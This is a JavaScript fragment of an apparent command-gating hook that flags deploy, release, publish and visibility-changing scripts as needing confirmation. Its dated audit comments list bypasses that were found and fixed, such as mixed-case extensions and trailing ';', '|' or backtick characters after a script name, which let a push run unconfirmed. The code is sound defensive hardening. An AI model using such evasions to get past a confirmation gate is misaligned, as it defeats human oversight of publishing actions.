  // 2026-07-11 Round 5 audit fix: this extension match had no /i flag while
  // the keyword match right next to it already did — an upper/mixed-case
  // extension (`node EVIL.MJS`, plausible on the case-insensitive
  // filesystems this plugin actually runs on) silently skipped script-
  // indirection detection entirely, for any script, not just a
  // confirm-script look-alike. Made case-insensitive to match its neighbour.
  // 2026-07-12 audit fix (safe-direction false-positive): the execution-
  // prefix group was OPTIONAL, so this rule only actually required (a) any
  // path ending in one of the four extensions appearing ANYWHERE in the
  // command, plus (b) one of the keywords appearing anywhere else — with no
  // requirement that the script is actually being executed. Reproduced live:
  // `grep -n "visibility" hooks.test.mjs` and a heredoc merely writing the
  // literal text "gh repo edit ... --public" into a fixture file were both
  // misclassified as push-capable, purely because a `.mjs` path and a
  // keyword co-occurred in the command string — this interfered with this
  // very audit's own read-only commands. Made the prefix mandatory (an
  // actual `./`, `bash `, `sh `, `node `, or `python[3] ` invocation) so a
  // bare mention of a script path in grep/cat/echo/a heredoc body no longer
  // counts as indirection. `python[3] ` added to the mandatory set so this
  // doesn't newly lose detection of a `.py` script run the normal way (it
  // was previously "detected" only as a side effect of the prefix being
  // optional, since python was never in the prefix list to begin with).
  // 2026-07-12 Round 2 re-verification fix (CRITICAL, found by execution):
  // this regex's OWN trailing anchor was still the old, too-narrow
  // `([ \t]|$)` — it was not on the list of regexes migrated to
  // LEXICAL_BOUNDARY earlier this round (the git-push/gh--push/send-pack
  // regexes above, and gate.mjs's bare --public), so the identical bypass
  // class reappeared here: `node evil-release.mjs;` (and the same with
  // `|`, `&`, `)`, a backtick, or a trailing newline, and with any of the
  // ./,bash,sh,node,python3 prefixes) was misclassified as non-push,
  // reproduced live end-to-end with a real secret and zero confirmation
  // tokens recorded. Fixed with the same shared boundary as every other
  // regex in this function.
  const SCRIPT_INDIRECTION_KEYWORDS = /(deploy|release|publish|ship|public|visibility)/i;
  if (new RegExp(`(^|[^A-Za-z0-9_])(\\.\\/|bash[ \\t]+|sh[ \\t]+|node[ \\t]+|python3?[ \\t]+)[^ \\t]*\\.(sh|mjs|js|py)${LEXICAL_BOUNDARY}`, 'i').test(c) &&
      SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
  if (/(^|[^A-Za-z0-9_])make[ \t]+\S+/i.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
  if (/(^|[^A-Za-z0-9_])(npm|pnpm|yarn)[ \t]+run[ \t]+\S+/i.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
  return false;
}
